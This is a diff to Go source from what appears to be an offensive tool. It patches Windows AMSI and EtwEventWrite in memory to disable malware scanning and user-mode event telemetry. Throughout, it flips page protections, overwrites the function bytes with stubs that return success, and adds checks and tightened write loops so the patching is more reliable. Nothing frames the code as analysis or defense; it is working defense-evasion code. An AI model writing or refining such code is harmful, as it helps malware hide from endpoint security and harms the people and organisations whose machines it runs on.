@@ -116,6 +116,11 @@ func randomAmsiPatchBytes() []byte {
 // UserData — a pointer to event data, NOT an output result. The patch
 // must NOT write through R9. It only zeros EAX (ULONG return = 0 =
 // ERROR_SUCCESS) and returns.
+//
+// Coverage note: patching EtwEventWrite disables user-mode ETW event
+// reporting through this specific API. Kernel-mode ETW providers,
+// NtTraceEvent, and other user-mode ETW wrappers are not affected.
+// This is a user-mode telemetry reduction, not a complete ETW kill.
 func randomEtwPatchBytes() []byte {
 	reg := randomZeroReg()
 	patch := make([]byte, patchLen)
@@ -326,25 +331,44 @@ func applyPatch(fp *funcPatch) error {
 	if len(fp.patch) == 0 {
 		return errors.New("securityctl: no patch bytes")
 	}
-	jitter(100*time.Microsecond, 1*time.Millisecond)
+	if len(fp.orig) != patchLen {
+		return errors.New("securityctl: original bytes not captured")
+	}
+
+	// Validate that the bytes at the target address still match what we
+	// read during Initialize. If another component modified the function,
+	// we refuse to patch — we'd overwrite an unknown instruction stream.
+	current := make([]byte, patchLen)
+	for i := 0; i < patchLen; i++ {
+		current[i] = *(*byte)(unsafe.Add(toPtr(fp.addr), i))
+	}
+	for i := 0; i < patchLen; i++ {
+		if current[i] != fp.orig[i] {
+			return fmt.Errorf("securityctl: target bytes changed at offset %d (expected %02X, found %02X) — refusing to patch", i, fp.orig[i], current[i])
+		}
+	}
+
 	page := fp.addr &^ 0xFFF
 	if _, err := evasion.ProtectVirtualMemory(evasion.CurrentProcess, page, 0x1000, pageRW); err != nil {
 		return fmt.Errorf("securityctl: protect RW: %w", err)
 	}
-	jitter(50*time.Microsecond, 200*time.Microsecond)
+
+	// Write all patch bytes in a tight loop with no jitter. Every
+	// nanosecond the page is writable with mixed old/new bytes is a
+	// window where another thread executing this function sees an
+	// inconsistent instruction stream.
 	for i := 0; i < len(fp.patch) && i < patchLen; i++ {
 		*(*byte)(unsafe.Add(toPtr(fp.addr), i)) = fp.patch[i]
 	}
-	jitter(50*time.Microsecond, 200*time.Microsecond)
+
 	if _, err := evasion.ProtectVirtualMemory(evasion.CurrentProcess, page, 0x1000, fp.origProt); err != nil {
-		// Protection restore failed — attempt to revert the patch bytes
-		// to avoid leaving the page writable with a half-applied patch.
+		// Protection restore failed — revert the patch bytes to leave
+		// the page in a consistent state (original bytes, original prot).
 		for i := 0; i < len(fp.orig) && i < patchLen; i++ {
 			*(*byte)(unsafe.Add(toPtr(fp.addr), i)) = fp.orig[i]
 		}
 		return fmt.Errorf("securityctl: protect restore after patch: %w", err)
 	}
-	jitter(100*time.Microsecond, 500*time.Microsecond)
 	return nil
 }
 
@@ -352,17 +376,46 @@ func restorePatch(fp *funcPatch) error {
 	if len(fp.orig) == 0 {
 		return errors.New("securityctl: no original bytes")
 	}
+	if len(fp.patch) != patchLen {
+		return errors.New("securityctl: patch bytes not captured")
+	}
+
+	// Check whether the function currently contains our patch. If
+	// another component already modified the bytes, we must not
+	// blindly overwrite with our saved originals — that would
+	// destroy the other component's modification.
+	current := make([]byte, patchLen)
+	for i := 0; i < patchLen; i++ {
+		current[i] = *(*byte)(unsafe.Add(toPtr(fp.addr), i))
+	}
+	alreadyPatched := true
+	for i := 0; i < patchLen; i++ {
+		if current[i] != fp.patch[i] {
+			alreadyPatched = false
+			break
+		}
+	}
+	if !alreadyPatched {
+		// Bytes don't match our patch — either already restored or
+		// modified by something else. Don't touch them.
+		return nil
+	}
+
 	page := fp.addr &^ 0xFFF
 	if _, err := evasion.ProtectVirtualMemory(evasion.CurrentProcess, page, 0x1000, pageRW); err != nil {
 		return fmt.Errorf("securityctl: protect RW: %w", err)
 	}
+
+	// Write original bytes in a tight loop — same atomicity concern
+	// as applyPatch.
 	for i := 0; i < len(fp.orig); i++ {
 		*(*byte)(unsafe.Add(toPtr(fp.addr), i)) = fp.orig[i]
 	}
+
 	if _, err := evasion.ProtectVirtualMemory(evasion.CurrentProcess, page, 0x1000, fp.origProt); err != nil {
-		// Protection restore failed — the page is left writable with
-		// original bytes written. Attempt to re-apply the patch so the
-		// page is at least in a consistent (patched) state.
+		// Protection restore failed — re-apply patch so the page is
+		// in a consistent (patched) state rather than writable with
+		// original bytes.
 		for i := 0; i < len(fp.patch) && i < patchLen; i++ {
 			*(*byte)(unsafe.Add(toPtr(fp.addr), i)) = fp.patch[i]
 		}
